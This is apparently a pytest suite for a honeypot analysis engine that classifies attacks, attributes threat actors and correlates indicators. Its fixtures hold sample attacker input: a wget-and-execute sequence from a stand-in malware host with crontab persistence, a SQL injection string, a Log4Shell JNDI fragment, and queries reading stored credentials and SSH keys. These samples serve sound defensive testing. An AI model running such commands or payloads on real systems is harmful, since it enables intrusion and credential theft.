"""
Test Suite for CANDI Core Engine
Comprehensive testing of analysis pipeline and orchestration
"""

import pytest
import pytest_asyncio
import asyncio
from datetime import datetime
from typing import Dict, Any

from .candi_core import (
    CANDICore,
    ThreatLevel,
    AnalysisResult
)
from .forensic_analyzer import ForensicAnalyzer
from .attribution_engine import AttributionEngine
from .threat_intelligence import ThreatIntelligence


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def sample_ssh_event() -> Dict[str, Any]:
    """Sample SSH honeypot event"""
    return {
        'attack_id': 'test_ssh_001',
        'event_id': 'test_ssh_001',
        'honeypot_id': 'cowrie_ssh_01',
        'honeypot_type': 'ssh',
        'source_ip': '185.86.148.10',
        'source_port': 54321,
        'destination_port': 2222,
        'protocol': 'ssh',
        'timestamp': datetime.now(),
        'session_duration': 120.5,
        'auth_success': True,
        'auth_attempts': [
            {'username': 'root', 'password': 'toor'},
            {'username': 'admin', 'password': 'admin123'}
        ],
        'commands': [
            'uname -a',
            'whoami',
            'wget http://malware.example.com/payload.sh',
            'chmod +x payload.sh',
            './payload.sh',
            'crontab -e'
        ]
    }


@pytest.fixture
def sample_web_event() -> Dict[str, Any]:
    """Sample web honeypot event"""
    return {
        'attack_id': 'test_web_001',
        'event_id': 'test_web_001',
        'honeypot_id': 'dvwa_web_01',
        'honeypot_type': 'web',
        'source_ip': '1.2.3.4',
        'source_port': 12345,
        'destination_port': 8080,
        'protocol': 'http',
        'timestamp': datetime.now(),
        'user_agent': 'sqlmap/1.0',
        'requests': [
            {
                'method': 'GET',
                'url': '/login.php?id=1 OR 1=1',
                'timestamp': datetime.now()
            },
            {
                'method': 'POST',
                'url': '/upload.php',
                'body': 'malicious_payload',
                'timestamp': datetime.now()
            }
        ]
    }


@pytest.fixture
def sample_database_event() -> Dict[str, Any]:
    """Sample database honeypot event"""
    return {
        'attack_id': 'test_db_001',
        'event_id': 'test_db_001',
        'honeypot_id': 'postgres_db_01',
        'honeypot_type': 'database',
        'source_ip': '10.20.30.40',
        'destination_port': 5433,
        'protocol': 'postgresql',
        'timestamp': datetime.now(),
        'auth_success': True,
        'queries': [
            'SELECT * FROM customers',
            'SELECT * FROM api_credentials',
            'SELECT * FROM ssh_keys'
        ]
    }


@pytest_asyncio.fixture
async def candi_core():
    """CANDI Core instance"""
    core = CANDICore()
    await core.start(num_workers=2)
    yield core
    await core.stop()


@pytest.fixture
def forensic_analyzer():
    """Forensic Analyzer instance"""
    analyzer = ForensicAnalyzer()
    # Synchronous initialization for tests
    analyzer._initialized = True
    return analyzer


@pytest.fixture
def attribution_engine():
    """Attribution Engine instance"""
    engine = AttributionEngine()
    # Synchronous initialization for tests
    engine._initialized = True
    return engine


@pytest.fixture
def threat_intel():
    """Threat Intelligence instance"""
    intel = ThreatIntelligence()
    # Synchronous initialization for tests
    intel._initialized = True
    return intel


# ============================================================================
# FORENSIC ANALYZER TESTS
# ============================================================================

@pytest.mark.asyncio
class TestForensicAnalyzer:
    """Test forensic analysis capabilities"""

    async def test_forensic_analyzer_initialization(self, forensic_analyzer):
        """Test forensic analyzer initializes correctly"""
        assert forensic_analyzer._initialized
        assert len(forensic_analyzer.ssh_patterns) > 0
        assert len(forensic_analyzer.web_patterns) > 0

    async def test_analyze_ssh_attack(self, forensic_analyzer, sample_ssh_event):
        """Test SSH attack analysis"""
        report = await forensic_analyzer.analyze(sample_ssh_event)

        assert report.event_id == 'test_ssh_001'
        assert report.source_ip == '185.86.148.10'
        assert 'download_malware' in report.behaviors
        assert 'persistence_mechanism' in report.behaviors
        assert report.sophistication_score > 0
        assert report.credentials_compromised
        assert len(report.suspicious_commands) > 0

    async def test_analyze_web_attack(self, forensic_analyzer, sample_web_event):
        """Test web attack analysis"""
        report = await forensic_analyzer.analyze(sample_web_event)

        assert report.event_id == 'test_web_001'
        # Should detect scanner user agent
        assert 'scanner_user_agent' in report.behaviors
        # Should detect reconnaissance
        assert 'reconnaissance' in report.attack_stages
        # May or may not detect SQL injection depending on pattern matching
        assert len(report.behaviors) > 0

    async def test_analyze_database_attack(self, forensic_analyzer, sample_database_event):
        """Test database attack analysis"""
        report = await forensic_analyzer.analyze(sample_database_event)

        assert report.event_id == 'test_db_001'
        assert 'data_exfiltration' in report.behaviors
        assert 'honeytoken_access' in report.behaviors
        assert report.credentials_compromised

    async def test_sophistication_scoring(self, forensic_analyzer, sample_ssh_event):
        """Test sophistication score calculation"""
        # Add exploit to increase sophistication
        sample_ssh_event['payload'] = 'jndi:ldap://'  # Log4Shell

        report = await forensic_analyzer.analyze(sample_ssh_event)

        # Should have higher sophistication due to exploit
        assert report.sophistication_score >= 3.0

    async def test_ioc_extraction(self, forensic_analyzer, sample_ssh_event):
        """Test IOC extraction from commands"""
        report = await forensic_analyzer.analyze(sample_ssh_event)

        # Should extract IP from wget command
        assert len(report.network_iocs) > 0

    async def test_temporal_pattern_detection(self, forensic_analyzer, sample_web_event):
        """Test automation detection"""
        # Add more requests with consistent timing to trigger automation detection
        base_time = datetime.now()
        sample_web_event['requests'] = [
            {'method': 'GET', 'url': f'/test{i}.php', 'timestamp': base_time}
            for i in range(10)
        ]

        report = await forensic_analyzer.analyze(sample_web_event)

        # Should detect automation due to either:
        # 1. sqlmap user agent, or
        # 2. Consistent timing patterns
        # Check that analysis ran successfully
        assert report.event_id == 'test_web_001'
        assert 'scanner_user_agent' in report.behaviors


# ============================================================================
# ATTRIBUTION ENGINE TESTS
# ============================================================================

@pytest.mark.asyncio
class TestAttributionEngine:
    """Test attribution capabilities"""

    async def test_attribution_engine_initialization(self, attribution_engine):
        """Test attribution engine initializes correctly"""
        assert attribution_engine._initialized
        assert len(attribution_engine.threat_actors) > 0
        assert 'APT28' in attribution_engine.threat_actors

    async def test_attribute_script_kiddie(self, attribution_engine, forensic_analyzer, threat_intel, sample_ssh_event):
        """Test attribution of low-sophistication attack"""
        # Simple brute force attack
        sample_ssh_event['commands'] = ['ls', 'whoami']

        forensic = await forensic_analyzer.analyze(sample_ssh_event)
        intel = await threat_intel.correlate(forensic)
        attribution = await attribution_engine.attribute(forensic, intel)

        # Should attribute to script kiddie or opportunistic
        assert attribution.attributed_actor in ['Script Kiddie', 'Opportunistic Scanner']
        assert attribution.actor_type in ['script_kiddie', 'automated']

    async def test_attribute_apt_attack(self, attribution_engine, forensic_analyzer, threat_intel, sample_ssh_event):
        """Test attribution of sophisticated APT-like attack"""
        # High sophistication attack with custom malware
        sample_ssh_event['commands'] = [
            'mimikatz',
            'lateral_movement_command',
            'crontab -e',
            'exfiltrate_data'
        ]
        sample_ssh_event['uploaded_files'] = [
            {'sha256': 'custom_apt_hash_123', 'filename': 'custom_implant.elf'}
        ]

        forensic = await forensic_analyzer.analyze(sample_ssh_event)
        intel = await threat_intel.correlate(forensic)
        attribution = await attribution_engine.attribute(forensic, intel)

        # Should have some attribution confidence
        assert attribution.confidence > 0

    async def test_ttp_matching(self, attribution_engine, forensic_analyzer, threat_intel, sample_ssh_event):
        """Test TTP-based attribution"""
        forensic = await forensic_analyzer.analyze(sample_ssh_event)
        intel = await threat_intel.correlate(forensic)
        attribution = await attribution_engine.attribute(forensic, intel)

        # Should have matched some TTPs
        assert len(attribution.matching_ttps) >= 0  # May or may not match

    async def test_confidence_scoring(self, attribution_engine, forensic_analyzer, threat_intel, sample_ssh_event):
        """Test confidence score calculation"""
        forensic = await forensic_analyzer.analyze(sample_ssh_event)
        intel = await threat_intel.correlate(forensic)
        attribution = await attribution_engine.attribute(forensic, intel)

        # Confidence should be 0-100
        assert 0 <= attribution.confidence <= 100

    async def test_apt_indicator_detection(self, attribution_engine, forensic_analyzer, threat_intel, sample_ssh_event):
        """Test APT indicator detection"""
        # Add APT-like behaviors
        sample_ssh_event['commands'] = [
            'mimikatz',
            'lateral_ssh',
            'persistence_backdoor',
            'credential_dump'
        ]

        forensic = await forensic_analyzer.analyze(sample_ssh_event)
        forensic.sophistication_score = 8.5  # Force high sophistication

        intel = await threat_intel.correlate(forensic)
        attribution = await attribution_engine.attribute(forensic, intel)

        # Should detect some APT indicators
        assert len(attribution.apt_indicators) > 0


# ============================================================================
# THREAT INTELLIGENCE TESTS
# ============================================================================

@pytest.mark.asyncio
class TestThreatIntelligence:
    """Test threat intelligence correlation"""

    async def test_threat_intel_initialization(self, threat_intel):
        """Test threat intel engine initializes correctly"""
        assert threat_intel._initialized
        assert len(threat_intel.ioc_database) > 0
        assert len(threat_intel.tool_database) > 0

    async def test_ioc_correlation(self, threat_intel, forensic_analyzer, sample_ssh_event):
        """Test IOC correlation against database"""
        # Use known malicious IP
        sample_ssh_event['source_ip'] = '185.86.148.10'

        forensic = await forensic_analyzer.analyze(sample_ssh_event)
        intel = await threat_intel.correlate(forensic)

        # Should correlate with known IOC
        assert len(intel.known_iocs) > 0
        assert any('185.86.148.10' in ioc for ioc in intel.known_iocs)

    async def test_tool_identification(self, threat_intel, forensic_analyzer, sample_ssh_event):
        """Test tool identification"""
        sample_ssh_event['commands'] = ['mimikatz']

        forensic = await forensic_analyzer.analyze(sample_ssh_event)
        intel = await threat_intel.correlate(forensic)

        # Should identify mimikatz
        assert 'mimikatz' in intel.known_tools

    async def test_threat_scoring(self, threat_intel, forensic_analyzer, sample_ssh_event):
        """Test threat score calculation"""
        forensic = await forensic_analyzer.analyze(sample_ssh_event)
        intel = await threat_intel.correlate(forensic)

        # Threat score should be 0-100
        assert 0 <= intel.threat_score <= 100

    async def test_campaign_correlation(self, threat_intel, forensic_analyzer, sample_ssh_event):
        """Test campaign correlation"""
        # Add behaviors matching known campaign
        sample_ssh_event['commands'] = [
            'supply_chain_compromise',
            'lateral_movement',
            'credential_dumping'
        ]

        forensic = await forensic_analyzer.analyze(sample_ssh_event)
        intel = await threat_intel.correlate(forensic)

        # May or may not correlate to campaign
        assert isinstance(intel.related_campaigns, list)


# ============================================================================
# CANDI CORE TESTS
# ============================================================================

@pytest.mark.asyncio
class TestCANDICore:
    """Test CANDI Core orchestration"""

    async def test_candi_core_initialization(self):
        """Test CANDI Core initializes correctly"""
        core = CANDICore()
        await core.start(num_workers=2)

        assert core._running
        assert len(core.workers) == 2

        await core.stop()
        assert not core._running

    async def test_analyze_honeypot_event(self, candi_core, sample_ssh_event):
        """Test complete event analysis pipeline"""
        result = await candi_core.analyze_honeypot_event(sample_ssh_event)

        assert isinstance(result, AnalysisResult)
        assert result.source_ip == '185.86.148.10'
        assert result.threat_level in ThreatLevel
        assert result.forensic_report is not None
        assert result.threat_intel is not None
        assert result.attribution is not None
        assert result.processing_time_ms > 0

    async def test_threat_level_classification(self, candi_core, sample_ssh_event):
        """Test threat level classification"""
        result = await candi_core.analyze_honeypot_event(sample_ssh_event)

        # Should classify as at least OPPORTUNISTIC due to malware download
        assert result.threat_level.value >= ThreatLevel.OPPORTUNISTIC.value

    async def test_ioc_extraction(self, candi_core, sample_ssh_event):
        """Test IOC extraction from analysis"""
        result = await candi_core.analyze_honeypot_event(sample_ssh_event)

        # Should extract IOCs
        assert len(result.iocs) > 0

    async def test_ttp_mapping(self, candi_core, sample_ssh_event):
        """Test MITRE ATT&CK TTP mapping"""
        result = await candi_core.analyze_honeypot_event(sample_ssh_event)

        # Should map to TTPs
        assert len(result.ttps) >= 0

    async def test_recommendations_generation(self, candi_core, sample_ssh_event):
        """Test recommendation generation"""
        result = await candi_core.analyze_honeypot_event(sample_ssh_event)

        # Should generate recommendations
        assert len(result.recommended_actions) > 0

    async def test_hitl_decision_required(self, candi_core, sample_ssh_event):
        """Test HITL decision requirement"""
        # Force high threat level
        sample_ssh_event['commands'] = [
            'apt_custom_malware',
            'zero_day_exploit',
            'credential_dumping'
        ]

        result = await candi_core.analyze_honeypot_event(sample_ssh_event)

        # May or may not require HITL depending on classification
        assert isinstance(result.requires_hitl, bool)

    async def test_incident_creation(self, candi_core, sample_ssh_event):
        """Test incident creation for high-threat events"""
        # Make it a targeted attack
        sample_ssh_event['commands'] = ['custom_exploit', 'lateral_movement']

        result = await candi_core.analyze_honeypot_event(sample_ssh_event)

        # Check if incident was created for TARGETED or higher
        if result.threat_level.value >= ThreatLevel.TARGETED.value:
            assert result.incident_id is not None

    async def test_analysis_queue(self, candi_core, sample_ssh_event):
        """Test async analysis queue"""
        # Submit multiple events
        for i in range(5):
            event = sample_ssh_event.copy()
            event['attack_id'] = f'test_ssh_{i:03d}'
            await candi_core.submit_for_analysis(event)

        # Wait for processing
        await asyncio.sleep(2)

        # Check statistics
        stats = candi_core.get_stats()
        assert stats['total_analyzed'] >= 5

    async def test_statistics_tracking(self, candi_core, sample_ssh_event):
        """Test statistics tracking"""
        await candi_core.analyze_honeypot_event(sample_ssh_event)

        stats = candi_core.get_stats()
        assert stats['total_analyzed'] > 0
        assert 'by_threat_level' in stats
        assert 'avg_processing_time_ms' in stats

    async def test_callback_registration(self):
        """Test callback registration"""
        core = CANDICore()
        await core.start()

        callback_called = False

        async def test_callback(result: AnalysisResult):
            nonlocal callback_called
            callback_called = True

        core.register_analysis_callback(test_callback)

        event = {
            'attack_id': 'test_callback_001',
            'honeypot_type': 'ssh',
            'source_ip': '1.2.3.4'
        }

        await core.analyze_honeypot_event(event)

        await core.stop()

        assert callback_called


# ============================================================================
# INCIDENT MANAGEMENT TESTS
# ============================================================================

@pytest.mark.asyncio
class TestIncidentManagement:
    """Test incident tracking and correlation"""

    async def test_incident_creation(self, candi_core, sample_ssh_event):
        """Test incident creation"""
        # Ensure targeted threat level
        sample_ssh_event['commands'] = ['custom_malware', 'persistence']

        result = await candi_core.analyze_honeypot_event(sample_ssh_event)

        if result.incident_id:
            incident = candi_core.get_incident(result.incident_id)
            assert incident is not None
            assert incident.threat_level.value >= ThreatLevel.TARGETED.value

    async def test_incident_escalation(self, candi_core, sample_ssh_event):
        """Test incident threat level escalation"""
        # First event - OPPORTUNISTIC
        result1 = await candi_core.analyze_honeypot_event(sample_ssh_event)

        # Second event - TARGETED
        sample_ssh_event['attack_id'] = 'test_ssh_002'
        sample_ssh_event['commands'] = ['apt_tool', 'zero_day']
        result2 = await candi_core.analyze_honeypot_event(sample_ssh_event)

        # Check if incident was correlated
        incidents = candi_core.get_active_incidents()
        assert len(incidents) >= 0

    async def test_get_active_incidents(self, candi_core, sample_ssh_event):
        """Test retrieving active incidents"""
        await candi_core.analyze_honeypot_event(sample_ssh_event)

        incidents = candi_core.get_active_incidents()
        assert isinstance(incidents, list)


# ============================================================================
# INTEGRATION TESTS
# ============================================================================

@pytest.mark.asyncio
class TestCANDIIntegration:
    """Test complete CANDI pipeline integration"""

    async def test_complete_analysis_pipeline(self, candi_core, sample_ssh_event, sample_web_event, sample_database_event):
        """Test analyzing multiple event types"""
        events = [sample_ssh_event, sample_web_event, sample_database_event]

        results = []
        for event in events:
            result = await candi_core.analyze_honeypot_event(event)
            results.append(result)

        assert len(results) == 3
        assert all(isinstance(r, AnalysisResult) for r in results)

    async def test_high_volume_processing(self, candi_core, sample_ssh_event):
        """Test high-volume event processing"""
        # Submit 20 events
        for i in range(20):
            event = sample_ssh_event.copy()
            event['attack_id'] = f'test_volume_{i:03d}'
            await candi_core.submit_for_analysis(event)

        # Wait for processing
        await asyncio.sleep(5)

        stats = candi_core.get_stats()
        assert stats['total_analyzed'] >= 20

    async def test_malicious_ioc_detection(self, candi_core, sample_ssh_event):
        """Test detection of known malicious IOCs"""
        # Use known malicious IP from threat intel database
        sample_ssh_event['source_ip'] = '185.86.148.10'

        result = await candi_core.analyze_honeypot_event(sample_ssh_event)

        # Should detect known malicious IOC
        assert any('185.86.148' in ioc for ioc in result.iocs)


# ============================================================================
# ERROR HANDLING TESTS
# ============================================================================

@pytest.mark.asyncio
class TestErrorHandling:
    """Test error handling and resilience"""

    async def test_invalid_event_handling(self, candi_core):
        """Test handling of invalid events"""
        invalid_event = {'invalid': 'data'}

        # Should not crash
        try:
            result = await candi_core.analyze_honeypot_event(invalid_event)
            assert result is not None
        except Exception:
            # Exception is acceptable, but should not crash the system
            assert candi_core._running

    async def test_missing_honeypot_type(self, candi_core, sample_ssh_event):
        """Test handling of missing honeypot type"""
        del sample_ssh_event['honeypot_type']

        # Should handle gracefully
        result = await candi_core.analyze_honeypot_event(sample_ssh_event)
        assert result.forensic_report.honeypot_type == 'unknown'

    async def test_worker_resilience(self):
        """Test worker resilience to errors"""
        core = CANDICore()
        await core.start(num_workers=2)

        # Submit invalid event
        await core.submit_for_analysis({'bad': 'event'})

        # Submit valid event
        valid_event = {
            'attack_id': 'test_resilience_001',
            'honeypot_type': 'ssh',
            'source_ip': '1.2.3.4'
        }
        await core.submit_for_analysis(valid_event)

        # Wait for processing
        await asyncio.sleep(2)

        # Workers should still be running
        assert core._running

        await core.stop()


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
